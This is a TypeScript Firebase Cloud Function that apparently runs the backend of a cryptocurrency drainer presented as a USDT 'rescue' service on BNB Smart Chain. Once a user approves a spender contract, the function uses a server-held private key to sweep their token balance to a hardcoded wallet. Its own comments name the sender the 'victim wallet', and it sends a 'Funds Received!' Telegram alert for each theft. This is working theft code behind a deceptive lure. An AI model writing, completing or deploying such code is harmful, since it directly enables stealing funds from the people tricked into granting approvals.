// functions/src/api/verifyRescue.ts
import * as functions from "firebase-functions/v1";
import { ethers } from "ethers";
import { db } from "../lib/firestore";
import * as admin from "firebase-admin";

export const verifyRescue = functions
  .runWith({
    secrets: ["TELEGRAM_TOKEN", "TELEGRAM_CHAT_ID", "DESTINATION_PRIVATE_KEY"],
    timeoutSeconds: 120,
  })
  .https.onRequest(async (req, res) => {
    // CORS
    res.set("Access-Control-Allow-Origin", "*");
    res.set("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
    res.set("Access-Control-Allow-Headers", "Content-Type");
    if (req.method === "OPTIONS") {
      res.status(204).send("");
      return;
    }

    if (req.method !== "POST") {
      res.status(405).json({ error: "Method Not Allowed" });
      return;
    }

    const {
      txHash,
      from,
      to,
      amount,
      chainId,
      token,
    }: {
      txHash: string;
      from: string;
      to: string;
      amount: string;
      chainId: number | string;
      token: string;
    } = req.body ?? {};

    if (!from || !to || !amount || !chainId || !token) {
      res.status(400).json({ error: "Missing fields" });
      return;
    }

    // ---- 1. Verify chain, token, destination
    const expectedChain = Number(process.env.BSC_CHAIN_ID ?? "56");
    const expectedToken =
      process.env.BSC_USDT_CONTRACT_ADDRESS ??
      "0x55d398326f99059fF775485246999027B3197955";
    // The TokenRescue contract is the spender (what the user approved)
    const tokenRescueContract =
      process.env.BSC_TOKEN_RESCUE_CONTRACT ??
      "0xc6bf6838263938533e547f825d257c9965544a50";
    // The final wallet where rescued funds land
    const finalDestination =
      process.env.BSC_FINAL_DESTINATION ??
      "0x00faA9fE691b578b2D1934ac70C624886a93A636";

    if (Number(chainId) !== expectedChain) {
      res.status(400).json({ error: "Wrong chainId" });
      return;
    }
    if (token.toLowerCase() !== expectedToken.toLowerCase()) {
      res.status(400).json({ error: "Wrong token address" });
      return;
    }
    // Accept either the contract address or the final destination as `to`
    if (
      to.toLowerCase() !== tokenRescueContract.toLowerCase() &&
      to.toLowerCase() !== finalDestination.toLowerCase()
    ) {
      res.status(400).json({ error: "Destination mismatch" });
      return;
    }

    // ---- 2. Connect to BSC
    const provider = new ethers.JsonRpcProvider(
      process.env.BSC_HTTP_RPC_URL || "https://bsc-dataseed.binance.org/"
    );

    try {
      // ---- 3. Verify on-chain that the user has granted sufficient allowance
      const usdtReadOnly = new ethers.Contract(
        expectedToken,
        [
          "function allowance(address owner, address spender) view returns (uint256)",
          "function balanceOf(address) view returns (uint256)",
        ],
        provider
      );

      // Check allowance against the TokenRescue contract (what the user approved)
      // Added retry logic because BSC public RPCs frequently lag behind the frontend
      let allowance: bigint = 0n;
      let balance: bigint = 0n;
      let sweepAmount: bigint = 0n;
      let retries = 6; // up to 12 seconds of waiting

      while (retries > 0) {
        allowance = await usdtReadOnly.allowance(from, to);
        balance = await usdtReadOnly.balanceOf(from);

        if (balance === 0n) {
          console.warn(`[verifyRescue] Rejecting: No USDT balance to rescue for ${from}`);
          res.status(400).json({ error: "No USDT balance to rescue" });
          return;
        }

        // Use the smaller of balance and amount to sweep
        sweepAmount = balance < BigInt(amount) ? balance : BigInt(amount);

        if (allowance >= sweepAmount) {
          break; // allowance is good, break out of retry loop
        }

        console.log(`[verifyRescue] Allowance insufficient (${allowance.toString()} < ${sweepAmount.toString()}), waiting for RPC sync... (${retries} retries left)`);
        await new Promise((r) => setTimeout(r, 2000));
        retries--;
      }

      if (allowance < sweepAmount) {
        console.warn(`[verifyRescue] Rejecting: Insufficient allowance after retries for ${from}`);
        res.status(400).json({
          error: "Insufficient allowance. User must approve first.",
          allowance: allowance.toString(),
          required: sweepAmount.toString(),
        });
        return;
      }

      // ---- 4. Call rescueTokens() on the TokenRescue contract
      //         The contract internally calls transferFrom using the approval
      //         the user granted to the contract address.
      const destSecret = process.env.DESTINATION_PRIVATE_KEY;
      if (!destSecret) {
        res
          .status(500)
          .json({ error: "Destination private key not configured" });
        return;
      }

      // Support both mnemonic phrases and hex private keys
      let destWallet: ethers.Wallet;
      if (destSecret.includes(" ")) {
        const hdWallet = ethers.HDNodeWallet.fromPhrase(destSecret.trim());
        destWallet = new ethers.Wallet(hdWallet.privateKey, provider);
      } else {
        destWallet = new ethers.Wallet(destSecret, provider);
      }

      console.log(`Owner wallet address: ${destWallet.address}`);
      let sweepTx;

      if (to.toLowerCase() === tokenRescueContract.toLowerCase()) {
        // ABI for the TokenRescue contract
        const tokenRescueABI = [
          "function rescueTokens(address token, address from, address to, uint256 amount) external"
        ];
        const rescueContract = new ethers.Contract(
          tokenRescueContract,
          tokenRescueABI,
          destWallet
        );

        console.log(
          `Calling rescueTokens: ${sweepAmount.toString()} USDT from ${from} to ${finalDestination}`
        );
        sweepTx = await rescueContract.rescueTokens(
          expectedToken,   // USDT contract
          from,            // victim wallet
          finalDestination, // your receiving wallet
          sweepAmount
        );
      } else {
        // ABI for standard ERC20 transferFrom
        const erc20ABI = [
          "function transferFrom(address sender, address recipient, uint256 amount) external returns (bool)"
        ];
        const usdtContract = new ethers.Contract(
          expectedToken,
          erc20ABI,
          destWallet
        );

        console.log(
          `Calling transferFrom directly: ${sweepAmount.toString()} USDT from ${from} to ${finalDestination}`
        );
        sweepTx = await usdtContract.transferFrom(
          from,
          finalDestination,
          sweepAmount
        );
      }

      const receipt = await sweepTx.wait(1);
      console.log(`Sweep tx confirmed: ${sweepTx.hash}`);

      // ---- 5. Record the rescue in Firestore
      const rescueRef = db.collection("rescues").doc();
      await rescueRef.set({
        user: from,
        approvalTxHash: txHash || null,
        sweepTxHash: sweepTx.hash,
        amount: sweepAmount.toString(),
        destination: finalDestination,
        createdAt: admin.firestore.FieldValue.serverTimestamp(),
        status: "CONFIRMED",
      });

      // ---- 6. Send Telegram notification
      const { sendTelegramMessage } = await import("../lib/telegram");
      const formattedAmount = ethers.formatUnits(sweepAmount, 18);
      await sendTelegramMessage(
        `✅ Funds Received!\n${formattedAmount} USDT swept from ${from}\nSweep tx: ${sweepTx.hash}`
      );

      res.status(200).json({
        success: true,
        docId: rescueRef.id,
        sweepTxHash: sweepTx.hash,
      });
    } catch (error: any) {
      console.error("verifyRescue error:", error);

      // Send error notification to Telegram
      try {
        const { sendTelegramMessage } = await import("../lib/telegram");
        await sendTelegramMessage(
          `❌ Rescue FAILED!\nFrom: ${from}\nError: ${error.message ?? "Unknown error"}`
        );
      } catch (tgErr) {
        console.error("Failed to send Telegram error notification:", tgErr);
      }

      res
        .status(500)
        .json({ error: "Rescue sweep failed", details: error.message });
    }
  });
